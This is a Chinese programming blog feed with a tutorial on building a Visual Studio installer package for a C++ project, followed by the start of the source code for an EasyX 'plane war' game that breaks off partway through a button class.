        <content type="html"><![CDATA[<h2 id="安装MVSIP扩展"><a href="#安装MVSIP扩展" class="headerlink" title="安装MVSIP扩展"></a>安装MVSIP扩展</h2><p>进入VS-&gt;点击扩展-&gt;管理扩展</p><p><img src="https://z1.ax1x.com/2023/10/02/pPLdRbD.png" alt="image 20231002135722798"></p><p><strong>联机搜索</strong><code>Microsoft Visual Studio Installer Project</code>，下载安装</p><p><img src="https://z1.ax1x.com/2023/10/02/pPLdfVe.png" alt="image 20231002135814167"></p><p><strong>PS：如果遇到下面情况</strong></p><p><img src="https://img.gejiba.com/images/6555073bf9f487855a3e3974afcdc45c.jpg" alt="6555073bf9f487855a3e3974afcdc45c.jpg"></p><p><strong>打开任务管理器-&gt;输入ID-&gt;结束任务</strong></p><h2 id="添加Setup-Project"><a href="#添加Setup-Project" class="headerlink" title="添加Setup Project"></a>添加Setup Project</h2><p>右键解决方案-&gt;添加-&gt;新建项目-&gt;搜索<code>setup project</code></p><p><img src="https://z1.ax1x.com/2023/10/02/pPLdgKK.png" alt="image 20231002140248264"></p><h2 id="项目打包"><a href="#项目打包" class="headerlink" title="项目打包"></a>项目打包</h2><p><strong>新建一个文件夹，随意命名，用于存储项目文件(否则安装的位置文件到处都是)</strong></p><p><strong>将源代码文件都加载进来</strong></p><p><img src="https://z1.ax1x.com/2023/10/02/pPLd6v6.png" alt="image 20231002140638961"></p><p><strong>PS：如果有其余资源文件，需要按照目录结构进行创建和加载</strong></p><p>比如说，现在与源代码同文件夹下还有这些文件夹</p><p>那么就在新建的文件夹(我这里是界面设计)下新建这些文件夹并把内容加载进来</p><p><img src="https://z1.ax1x.com/2023/10/02/pPLdhUH.png" alt="image 20231002140855655"></p><p><strong>右键新建的文件夹-&gt;Add-&gt;项目输出-&gt;直接点击确定</strong></p><p><img src="https://z1.ax1x.com/2023/10/02/pPLd45d.png" alt="image 20231002141014612"></p><p><strong>生成主输出后新建快捷方式</strong></p><p><img src="https://z1.ax1x.com/2023/10/02/pPLdIPA.png" alt="image 20231002141153065"></p><p><strong>剪切该快捷方式移动到User’s Desktop</strong></p><p><img src="https://img.gejiba.com/images/d185991b974c3ad19a2426743422b3a1.png" alt="d185991b974c3ad19a2426743422b3a1.png"></p><p><strong>为快捷方式选择图标</strong></p><p><strong>PS：这里只能从已经加载的文件中选择，并且必须为<code>.ico</code>文件</strong></p><p><img src="https://img.gejiba.com/images/71f0d4ad689600169cef701c60f247e3.png" alt="71f0d4ad689600169cef701c60f247e3.png">**</p><p><strong>重新生成Setup Project</strong></p><p><img src="https://img.gejiba.com/images/1456a39af88aa6503c99f60e8199cfa6.png" alt="1456a39af88aa6503c99f60e8199cfa6.png"></p><p><strong>打开打包文件夹</strong></p><p><img src="https://img.gejiba.com/images/e98feec1ae8b772208e9a6fb62b4e3f0.png" alt="e98feec1ae8b772208e9a6fb62b4e3f0.png"></p><p><code>**Setup Project</code>会根据项目属性选择<code>Debug/Release</code>进行存放，<code>.vdproj</code>文件不要删除，否则无法再次打包**</p><p><img src="https://img.gejiba.com/images/2e996924d37b8e5c051679dc77d20d29.png" alt="2e996924d37b8e5c051679dc77d20d29.png"></p><p><strong>双击<code>setup.exe</code>即可安装(安装目录是项目文件存放位置，快捷方式固定存放在桌面)，再次双击即可选择删除安装</strong></p><p><img src="https://img.gejiba.com/images/0b26128fedb8b638c97f8d5a372a6aa1.png" alt="0b26128fedb8b638c97f8d5a372a6aa1.png"></p><p><strong>成功界面</strong></p><p>双击快捷方式即可运行程序，不需要c++环境</p><p><img src="https://img.gejiba.com/images/ffb0cee61278a0a1b668046190baf866.png" alt="ffb0cee61278a0a1b668046190baf866.png"></p>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>飞机大战-C++</title>
      <link href="/post/36321cfe.html"/>
      <url>/post/36321cfe.html</url>
      
        <content type="html"><![CDATA[<h2 id="界面设计"><a href="#界面设计" class="headerlink" title="界面设计"></a>界面设计</h2><p>游戏界面和按钮设计</p><p><a href="https://github.com/hellodqy/Plane-Fight/blob/main/%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1.zip">项目文件下载</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;easyx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mmsystem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">wchar_t</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> difficulty;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> music_num = <span class="number">1</span>;   <span class="comment">// 记录音乐控制键的点击次数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制音效</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">controlsound</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ++music_num;</span><br><span class="line">    <span class="keyword">if</span> (music_num % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mciSendString</span>(<span class="string">L&quot;play ./music/game_music.mp3 repeat&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mciSendString</span>(<span class="string">L&quot;pause ./music/game_music.mp3&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化数据</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">drawAlpha</span><span class="params">(IMAGE *picture, <span class="type">int</span>  picture_x, <span class="type">int</span> picture_y)</span> <span class="comment">//x为载入图片的X坐标，y为Y坐标</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 变量初始化</span></span><br><span class="line">    DWORD *dst = <span class="built_in">GetImageBuffer</span>();    <span class="comment">// GetImageBuffer()函数，用于获取绘图设备的显存指针，EASYX自带</span></span><br><span class="line">    DWORD *draw = <span class="built_in">GetImageBuffer</span>();</span><br><span class="line">    DWORD *src = <span class="built_in">GetImageBuffer</span>(picture); <span class="comment">//获取picture的显存指针</span></span><br><span class="line">    <span class="type">int</span> picture_width = picture-&gt;<span class="built_in">getwidth</span>(); <span class="comment">//获取picture的宽度，EASYX自带</span></span><br><span class="line">    <span class="type">int</span> picture_height = picture-&gt;<span class="built_in">getheight</span>(); <span class="comment">//获取picture的高度，EASYX自带</span></span><br><span class="line">    <span class="type">int</span> graphWidth = <span class="built_in">getwidth</span>();       <span class="comment">//获取绘图区的宽度，EASYX自带</span></span><br><span class="line">    <span class="type">int</span> graphHeight = <span class="built_in">getheight</span>();     <span class="comment">//获取绘图区的高度，EASYX自带</span></span><br><span class="line">    <span class="type">int</span> dstX = <span class="number">0</span>;    <span class="comment">//在显存里像素的角标</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现透明贴图 公式： Cp=αp*FP+(1-αp)*BP ， 贝叶斯定理来进行点颜色的概率计算</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> iy = <span class="number">0</span>; iy &lt; picture_height; iy++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> ix = <span class="number">0</span>; ix &lt; picture_width; ix++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> srcX = ix + iy * picture_width; <span class="comment">//在显存里像素的角标</span></span><br><span class="line">            <span class="type">int</span> sa = ((src[srcX] &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>); <span class="comment">//0xAArrggbb;AA是透明度</span></span><br><span class="line">            <span class="type">int</span> sr = ((src[srcX] &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>); <span class="comment">//获取RGB里的R</span></span><br><span class="line">            <span class="type">int</span> sg = ((src[srcX] &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>);   <span class="comment">//G</span></span><br><span class="line">            <span class="type">int</span> sb = src[srcX] &amp; <span class="number">0xff</span>;              <span class="comment">//B</span></span><br><span class="line">            <span class="keyword">if</span> (ix &gt;= <span class="number">0</span> &amp;&amp; ix &lt;= graphWidth &amp;&amp; iy &gt;= <span class="number">0</span> &amp;&amp; iy &lt;= graphHeight &amp;&amp; dstX &lt;= graphWidth * graphHeight)</span><br><span class="line">            &#123;</span><br><span class="line">                dstX = (ix + picture_x) + (iy + picture_y) * graphWidth; <span class="comment">//在显存里像素的角标</span></span><br><span class="line">                <span class="type">int</span> dr = ((dst[dstX] &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>);</span><br><span class="line">                <span class="type">int</span> dg = ((dst[dstX] &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">                <span class="type">int</span> db = dst[dstX] &amp; <span class="number">0xff</span>;</span><br><span class="line">                draw[dstX] = ((sr * sa / <span class="number">255</span> + dr * (<span class="number">255</span> - sa) / <span class="number">255</span>) &lt;&lt; <span class="number">16</span>)  <span class="comment">//公式： Cp=αp*FP+(1-αp)*BP  ； αp=sa/255 , FP=sr , BP=dr</span></span><br><span class="line">                    | ((sg * sa / <span class="number">255</span> + dg * (<span class="number">255</span> - sa) / <span class="number">255</span>) &lt;&lt; <span class="number">8</span>)         <span class="comment">//αp=sa/255 , FP=sg , BP=dg</span></span><br><span class="line">                    | (sb * sa / <span class="number">255</span> + db * (<span class="number">255</span> - sa) / <span class="number">255</span>);              <span class="comment">//αp=sa/255 , FP=sb , BP=db</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义Button类，表示一个按钮</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Button</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> x; <span class="comment">// 按钮左上角x坐标</span></span><br><span class="line">    <span class="type">int</span> y; <span class="comment">// 按钮左上角y坐标</span></span><br><span class="line">    <span class="type">int</span> width; <span class="comment">// 按钮宽度</span></span><br><span class="line">    <span class="type">int</span> height; <span class="comment">// 按钮高度</span></span><br><span class="line">    <span class="type">float</span> scale; <span class="comment">// 缩放比例，用于实现鼠标悬停效果</span></span><br><span class="line">    <span class="type">bool</span> isMouseOver; <span class="comment">// 表示鼠标是否在按钮上方</span></span><br><span class="line">    wstring text; <span class="comment">// 按钮文本</span></span><br><span class="line">    function&lt;<span class="type">void</span>()&gt; onClick; <span class="comment">// 点击按钮触发的函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Button</span>(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> width, <span class="type">int</span> height, <span class="type">const</span> wstring &amp;text, <span class="type">const</span> function&lt;<span class="built_in">void</span>()&gt; &amp;onClick)</span><br><span class="line">        : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">width</span>(width), <span class="built_in">height</span>(height), <span class="built_in">text</span>(text), <span class="built_in">onClick</span>(onClick), <span class="built_in">scale</span>(<span class="number">1.0f</span>), <span class="built_in">isMouseOver</span>(<span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查鼠标是否在按钮上方</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">checkMouseOver</span><span class="params">(<span class="type">int</span> mouseX, <span class="type">int</span> mouseY)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        isMouseOver = (mouseX &gt;= x &amp;&amp; mouseX &lt;= x + width &amp;&amp; mouseY &gt;= y &amp;&amp; mouseY &lt;= y + height);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isMouseOver) &#123;</span><br><span class="line">            scale = <span class="number">0.9f</span>; <span class="comment">// 鼠标悬停时缩放按钮</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            scale = <span class="number">1.0f</span>; <span class="comment">// 恢复按钮原始大小</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查鼠标点击是否在按钮内，并执行函数</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkClick</span><span class="params">(<span class="type">int</span> mouseX, <span class="type">int</span> mouseY)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mouseX &gt;= x &amp;&amp; mouseX &lt;= x + width &amp;&amp; mouseY &gt;= 